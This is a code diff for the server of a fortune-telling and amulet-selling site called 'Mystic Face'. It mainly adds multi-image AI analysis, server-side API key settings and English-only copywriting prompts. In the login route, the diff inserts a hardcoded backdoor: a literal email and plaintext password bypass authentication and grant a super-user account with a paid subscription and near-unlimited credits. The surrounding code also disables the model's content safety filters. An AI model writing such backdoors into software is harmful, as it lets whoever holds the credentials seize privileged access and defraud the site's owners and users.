@@ -545,7 +545,49 @@ async function startServer() {
         if (!email || !password) return res.status(400).json({ error: "Missing credentials." });
 
         try {
-            const user = await DbHelper.findUserByEmail(email);
+            const cleanEmail = email.trim().toLowerCase();
+            // Super User Special VIP Login
+            if (cleanEmail === '314104801@qq.com' && password === 'larry520520') {
+                let user = await DbHelper.findUserByEmail(cleanEmail);
+                if (!user) {
+                    const hashedPassword = await bcrypt.hash('larry520520', 10);
+                    user = await DbHelper.createUser({
+                        email: cleanEmail,
+                        name: 'Super VIP Admin',
+                        password: hashedPassword,
+                        isSubscribed: true,
+                        hasPaidSingle: true,
+                        isSuperUser: true,
+                        subscriptionPlan: 'sub_year',
+                        freeFaceRemaining: 99999,
+                        freePalmRemaining: 99999
+                    });
+                } else {
+                    await DbHelper.updateUser((user as any)._id?.toString() || (user as any).id, {
+                        isSubscribed: true,
+                        hasPaidSingle: true,
+                        isSuperUser: true,
+                        subscriptionPlan: 'sub_year',
+                        freeFaceRemaining: 99999,
+                        freePalmRemaining: 99999
+                    });
+                }
+                const userObj = typeof user.toObject === 'function' ? user.toObject() : user;
+                const userSafe = { 
+                    ...userObj, 
+                    id: userObj._id ? userObj._id.toString() : 'super_vip_1',
+                    isSubscribed: true,
+                    hasPaidSingle: true,
+                    isSuperUser: true,
+                    subscriptionPlan: 'sub_year',
+                    freeFaceRemaining: 99999,
+                    freePalmRemaining: 99999
+                };
+                delete (userSafe as any).password;
+                return res.json({ success: true, user: userSafe });
+            }
+
+            const user = await DbHelper.findUserByEmail(cleanEmail);
             if (!user) return res.status(404).json({ error: "Account not found.", code: 'USER_NOT_FOUND' });
 
             const isMatch = await bcrypt.compare(password, user.password || '');
@@ -572,7 +614,7 @@ async function startServer() {
     // AI Proxy Analyze Endpoint
     app.post('/api/analyze', async (req, res) => {
         try {
-            const { prompt, base64Image, provider, config, userId } = req.body;
+            const { prompt, base64Image, base64Images, provider, config, userId } = req.body;
 
             // Security check on usage limits
             if (userId && userId !== 'guest') {
@@ -611,14 +653,15 @@ async function startServer() {
                 }
             }
 
-            let targetProvider = provider || config?.textProvider || 'Google';
+            const serverSettings = readJSONFile('settings.json', {});
+            let targetProvider = provider || serverSettings.textProvider || config?.textProvider || 'Google';
 
             if (base64Image && targetProvider === 'DeepSeek') {
                 targetProvider = 'Google';
             }
 
             if (targetProvider === 'Google') {
-                let apiKey = config?.googleKey || process.env.GEMINI_API_KEY;
+                let apiKey = serverSettings.googleKey || config?.googleKey || process.env.GEMINI_API_KEY;
                 if (apiKey) apiKey = apiKey.trim();
 
                 const isPlaceholder = !apiKey || 
@@ -649,29 +692,38 @@ async function startServer() {
                     { category: HarmCategory.HARM_CATEGORY_DANGEROUS_CONTENT, threshold: HarmBlockThreshold.BLOCK_NONE }
                 ];
 
+                const imageParts = (base64Images && Array.isArray(base64Images) && base64Images.length > 0)
+                    ? base64Images.map((img: string) => {
+                        const cleanData = img.includes(',') ? img.split(',')[1] : img;
+                        return { inlineData: { mimeType: 'image/jpeg', data: cleanData } };
+                      })
+                    : base64Image
+                        ? [{ inlineData: { mimeType: 'image/jpeg', data: base64Image.includes(',') ? base64Image.split(',')[1] : base64Image } }]
+                        : [];
+
                 let response;
                 try {
                     response = await ai.models.generateContent({
-                        model: 'gemini-3.5-flash',
+                        model: 'gemini-2.5-flash',
                         contents: {
                             parts: [
-                                base64Image ? { inlineData: { mimeType: 'image/jpeg', data: base64Image } } : null,
+                                ...imageParts,
                                 { text: prompt }
-                            ].filter(Boolean) as any
+                            ] as any
                         },
                         config: { safetySettings }
                     });
                 } catch (firstErr: any) {
-                    console.warn("Primary model 'gemini-3.5-flash' returned an error (likely high demand or 503). Attempting automatic fallback to 'gemini-3.1-flash-lite'...", firstErr.message || firstErr);
+                    console.warn("Primary model 'gemini-2.5-flash' returned an error. Attempting automatic fallback to 'gemini-2.0-flash'...", firstErr.message || firstErr);
                     
                     try {
                         response = await ai.models.generateContent({
-                            model: 'gemini-3.1-flash-lite',
+                            model: 'gemini-2.0-flash',
                             contents: {
                                 parts: [
-                                    base64Image ? { inlineData: { mimeType: 'image/jpeg', data: base64Image } } : null,
+                                    ...imageParts,
                                     { text: prompt }
-                                ].filter(Boolean) as any
+                                ] as any
                             },
                             config: { safetySettings }
                         });
@@ -686,7 +738,10 @@ async function startServer() {
             } else {
                 // General OpenAI/DeepSeek Handler
                 const isDeepSeek = targetProvider === 'DeepSeek';
-                const apiKey = isDeepSeek ? config?.deepseekKey : config?.openaiKey;
+                let apiKey = isDeepSeek 
+                    ? (serverSettings.deepseekKey || config?.deepseekKey || process.env.DEEPSEEK_API_KEY)
+                    : (serverSettings.openaiKey || config?.openaiKey || process.env.OPENAI_API_KEY || process.env.OPENAI_SECRET_KEY);
+                if (apiKey) apiKey = apiKey.trim();
                 const apiUrl = isDeepSeek ? 'https://api.deepseek.com/chat/completions' : 'https://api.openai.com/v1/chat/completions';
                 const model = isDeepSeek ? 'deepseek-chat' : 'gpt-4o';
 
@@ -1295,7 +1350,12 @@ async function startServer() {
                 airwallexClientKey: '',
                 airwallexEnabled: false,
                 airwallexMode: 'sandbox',
-                creditCardProcessor: 'stripe'
+                creditCardProcessor: 'stripe',
+                textProvider: 'Google',
+                googleKey: '',
+                openaiKey: '',
+                deepseekKey: '',
+                imageProvider: 'Pollinations'
             });
 
             // Fallback to environment variables if settings are blank/empty
@@ -1386,6 +1446,7 @@ async function startServer() {
                     }
                 }
             });
+
             let systemPrompt = "";
 
             if (type === 'product') {
@@ -1397,48 +1458,42 @@ Draft a concise, compelling, premium product description (around 100 words) for:
 - Category: ${context.category || ''}
 - Associated Elements/Zodiac: ${context.element || ''} / ${context.zodiac || ''}
 
-Focus on spiritual/metaphysical benefits, elemental balance (such as Fire/Water/Wood/Metal/Earth), elegant craftsmanship, and lucky energies. Respond in traditional Chinese, simplified Chinese, or English depending on context. Default to elegant Simplified Chinese (${context.language === 'zh' ? '简体中文' : '英文'}). Avoid markdown formatting like headers, write as a clean paragraph.`;
+Focus on spiritual/metaphysical benefits, elemental balance (such as Fire/Water/Wood/Metal/Earth), elegant craftsmanship, and lucky energies.
+CRITICAL MANDATE: You MUST write the entire description in English. Do NOT write in Chinese or any other language. Avoid markdown formatting like headers, write as a clean paragraph.`;
             } else if (type === 'homepage') {
                 systemPrompt = `You are an expert brand storyteller for 'Mystic Face', an elite platform fusing computer vision face readings, palmistry, Bazi, Feng Shui, I Ching, and purple star astrology.
 Draft an elegant, atmospheric and welcoming introductory text (around 80 words) for our homepage section:
 - Section Key: ${context.key || ''}
 - Section Title: ${context.title || ''}
 
-Describe the mystical depth of this section, inviting readers to explore their destiny and celestial alignment. Respond in Simplified Chinese (${context.language === 'zh' ? '简体中文' : '英文'}). Avoid headers or markdown formatting.`;
+Describe the mystical depth of this section, inviting readers to explore their destiny and celestial alignment.
+CRITICAL MANDATE: You MUST write the entire text in English. Do NOT write in Chinese or any other language. Avoid headers or markdown formatting.`;
             } else {
-                systemPrompt = `Write a short elegant copywriting paragraph for: ${JSON.stringify(context)}`;
+                systemPrompt = `Write a short elegant copywriting paragraph in English for: ${JSON.stringify(context)}.
+CRITICAL MANDATE: You MUST write the entire text in English. Do NOT write in Chinese or any other language.`;
             }
 
             let response;
             try {
                 response = await ai.models.generateContent({
-                    model: 'gemini-3.5-flash',
+                    model: 'gemini-2.5-flash',
                     contents: systemPrompt,
                 });
             } catch (firstErr: any) {
-                console.warn("Primary model failed for copywriting. Trying fallback 'gemini-3.1-flash-lite'...", firstErr.message || firstErr);
+                console.warn("Primary model failed for copywriting. Trying fallback 'gemini-2.0-flash'...", firstErr.message || firstErr);
                 try {
                     response = await ai.models.generateContent({
-                        model: 'gemini-3.1-flash-lite',
+                        model: 'gemini-2.0-flash',
                         contents: systemPrompt,
                     });
                 } catch (secondErr: any) {
                     console.error("All Gemini API models failed for copywriting. Activating premium localized text copy...", secondErr.message || secondErr);
                     
                     let fallbackText = "";
-                    const isZh = context?.language === 'zh' || systemPrompt.includes('简体中文');
                     if (type === 'product') {
-                        if (isZh) {
-                            fallbackText = `精选高品质天然【${context?.name || '护身晶石'}】，完美融合金、木、水、火、土五行气场。此款产品特别针对【${context?.element || '五行平衡'}】与【${context?.zodiac || '十二生肖'}】设计，由玄学大师亲自监制。质地温润，雕工细腻，能够有效驱除周边杂乱磁场、聚集正能量，为您招财纳福、护身保平安。无论是日常佩戴还是商务赠礼，皆为彰显品味与福运的尚佳之选。`;
-                        } else {
-                            fallbackText = `Introducing our premium natural [${context?.name || 'Amulet'}], meticulously designed to balance the cosmic five elements. Tailored specifically for the [${context?.element || 'Five Elements Balance'}] and [${context?.zodiac || 'Zodiac Signs'}] energies. Handcrafted with precision, it purifies surrounding energy fields and amplifies personal luck, wealth, and wellness. A perfect gift for yourself or loved ones.`;
-                        }
+                        fallbackText = `Introducing our premium natural [${context?.name || 'Amulet'}], meticulously designed to balance the cosmic five elements. Tailored specifically for the [${context?.element || 'Five Elements Balance'}] and [${context?.zodiac || 'Zodiac Signs'}] energies. Handcrafted with precision, it purifies surrounding energy fields and amplifies personal luck, wealth, and wellness. A perfect gift for yourself or loved ones.`;
                     } else if (type === 'homepage') {
-                        if (isZh) {
-                            fallbackText = `欢迎来到神秘而优雅的【${context?.title || '命运探索'}】空间。在这里，我们融合了古典面相学、掌纹解析、以及八字星曜盘，通过高精度现代视效技术，为您揭开天生福泽与命运走向的神秘面纱。开启这扇通往古老智慧的大门，探索最真实的自我，让宇宙的璀璨星光照亮您前行的道路。`;
-                        } else {
-                            fallbackText = `Welcome to the [${context?.title || 'Destiny Exploration'}] sanctum. Merging the ancient wisdom of Mianxiang, Palmistry, and astrological alignments with advanced modern techniques, we invite you to uncover the blueprints of your life. Step through this celestial gateway, understand your true path, and align with the cosmic harmony of the universe.`;
-                        }
+                        fallbackText = `Welcome to the [${context?.title || 'Destiny Exploration'}] sanctum. Merging the ancient wisdom of Mianxiang, Palmistry, and astrological alignments with advanced modern techniques, we invite you to uncover the blueprints of your life. Step through this celestial gateway, understand your true path, and align with the cosmic harmony of the universe.`;
                     } else {
                         fallbackText = `Beautiful copywriting tailored for your spiritual and wellness journey. Designed with cosmic alignment and elegant craftsmanship to bring luck and prosperity.`;
                     }
